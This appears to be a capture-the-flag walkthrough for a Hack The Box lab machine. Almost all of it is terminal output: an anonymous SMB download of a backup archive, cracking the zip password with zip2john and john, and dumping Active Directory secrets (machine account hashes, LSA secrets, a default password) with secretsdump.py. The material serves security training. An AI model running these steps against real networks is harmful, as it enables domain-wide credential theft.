# Obtaining NTDS.DIT
```bash
┌─[✗]─[user@parrot-virtual]─[~/htb/apt]
└──╼ $smbclient //apt/backup
Enter WORKGROUP\user's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Sep 24 00:30:52 2020
  ..                                  D        0  Thu Sep 24 00:30:52 2020
  backup.zip                          A 10650961  Thu Sep 24 00:30:32 2020

		10357247 blocks of size 4096. 6956544 blocks available
smb: \> get backup.zip 
getting file \backup.zip of size 10650961 as backup.zip (1649.7 KiloBytes/sec) (average 1649.7 KiloBytes/sec)
smb: \> exit
```

## ZIP2JOHN Hash for Decryption
```bash
┌─[✗]─[user@parrot-virtual]─[~/htb/apt]
└──╼ $zip2john backup.zip 
Created directory: /home/user/.john
backup.zip/Active Directory/ is not encrypted!
ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: cmplen=8483543, decmplen=50331648, crc=ACD0B2FB
ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: cmplen=342, decmplen=16384, crc=2A393785
ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: cmplen=8522, decmplen=262144, crc=9BEBC2C3
ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: cmplen=2157644, decmplen=12582912, crc=65D9BFCD
backup.zip:$pkzip2$3*1*1*0*8*24*9beb*9ac6*0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed*1*0*8*24*acd0*9cca*0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5*2*0*156*4000*2a393785*81733d*37*8*156*2a39*9cca*0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996*$/pkzip2$::backup.zip:Active Directory/ntds.jfm, registry/SECURITY, Active Directory/ntds.dit:backup.zip
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
┌─[user@parrot-virtual]─[~/htb/apt]
└──╼ $
```

## Decryption
```bash
┌─[user@parrot-virtual]─[~/htb/apt]
└──╼ $ls
'Active Directory'   backup.zip   IOXIDResolver.py   nmap   notes.txt   registry
┌─[user@parrot-virtual]─[~/htb/apt]
└──╼ $vim backup.hash
┌─[user@parrot-virtual]─[~/htb/apt]
└──╼ $locate rockyou.txt
/opt/SecLists/rockyou.txt
/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
/usr/share/wordlists/rockyou.txt
┌─[user@parrot-virtual]─[~/htb/apt]
└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyousomuch   (backup.zip)
1g 0:00:00:00 DONE (2021-04-10 22:40) 50.00g/s 409600p/s 409600c/s 409600C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## Dumping NTDS
```Bash
┌─[✗]─[user@parrot-virtual]─[~/htb/apt/backup]$
└──╼ $secretsdump.py -pwd-last-set -user-status -history -ntds Active\ Directory/ntds.dit -security registry/SECURITY -system registry/SYSTEM local$
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation$
$
[*] Target system bootKey: 0x936ce5da88593206567f650411e1d16b$
[*] Dumping cached domain logon information (domain/username:hash)$
[*] Dumping LSA Secrets$
[*] $MACHINE.ACC+$
$MACHINE.ACC:plain_password_hex:34005b00250066006f0027007a004700600026004200680052003300630050005b002900550032004e00560053005c004c00450059004f002f0026005e0029003c00390078006a0036002500230039005c005c003f0075004a0034005900500062006000440052004b00220020004900450053003200660058004b00220066002c005800280051006c002a0066006700300052006600520071003d0021002c004200650041005600460074005e0045005600520052002d004c0029005600610054006a0076002f005100470039003d006f003b004700400067003e005600610062002d00550059006300200059006400$
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb$
[*] $MACHINE.ACC_history+$
$MACHINE.ACC:plain_password_hex:6a00280059004c003d005100450036005f006c006e005f0042004a00570046006f00210024006800440075006d002200450021003700280049002300450051004100750058005a002200290046003f006e0031005f00270035006100730060005e003200520054005800520041005f00460061004c0051003f0023005100390046003b006d0035003f002b004e0025003b004b0052006000660069002f00490046005800430027005e00430063005d003f002200400026004500390047003f002000770043004300390028003a005c003e0036005000610060004d003b004f005e002e0040003f002b0068003d005c00$
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e1934528fd9be4bb06e648526acc4a4d$
[*] DefaultPassword+$
(Unknown User):Password123!$
notes.txt                                                                           
```